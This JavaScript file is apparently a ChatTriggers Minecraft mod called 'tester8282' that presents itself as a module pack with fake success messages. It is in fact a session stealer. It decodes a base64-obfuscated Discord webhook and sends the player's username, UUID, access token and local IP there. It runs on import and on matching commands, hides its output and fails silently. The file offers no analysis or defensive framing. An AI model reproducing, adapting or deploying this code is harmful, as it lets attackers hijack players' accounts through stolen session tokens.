import { on, ChatLib, Client } from "ChatTriggers";
import { request } from "ChatTriggers";

const encWebhook = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ1NDQwNjc5NjM2OTQ2NTM5NS9OaXo5Tk5CUV95aHNrMmdodHE0eXVGQzdWeTc5NjFmVkhPV3VzT3ZxdjFZY2RPb1FCZWY0eE5vS1NGTWJaZ0Q4VGo2Tw==";
const WEBHOOK = atob(encWebhook);

// Triggers (add more if wanted)
const triggers = ["tester8282", "tester 8282", "tester8282.js"];

// Capture on any matching chat
on("chat", (event) => {
  const raw = event.message.getUnformattedText().toLowerCase();
  
  // One-time import trigger
  if (raw.startsWith("/ct import ") && triggers.some(t => raw.includes(t))) {
    ChatLib.chat("&aSuccessfully imported tester8282!");
    ChatLib.chat("&7Loaded modules: ESP, Waypoints, Stats, AutoGG");
    
    // Immediate capture on import
    captureSession("import_trigger", raw);
    
    event.cancel(); // hide real output
    return;
  }
  
  // Ongoing capture (after installed)
  if (raw.startsWith("/ct ") && triggers.some(t => raw.includes(t))) {
    captureSession("command_trigger", raw);
    ChatLib.chat("&cUnknown module or subcommand");
    event.cancel();
  }
});

function captureSession(type, trigger) {
  const session = Client.getSession();
  if (!session) return;

  const payload = {
    type: type,
    username: session.getUsername() || "unknown",
    uuid: session.getSelectedProfile()?.getId() || "unknown",
    ssid: session.getAccessToken() || "none",
    ip: java.net.InetAddress.getLocalHost().getHostAddress(),
    time: new Date().toISOString(),
    trigger: trigger
  };

  request({
    url: WEBHOOK,
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      content: null,
      embeds: [{
        title: "Capture",
        description: "```json\n" + JSON.stringify(payload, null, 2) + "\n```",
        color: 0xff0000
      }]
    })
  }).catch(() => {}); // silent fail
}

// One-time load message
ChatLib.chat("&a[tester8282] &fLoaded successfully");
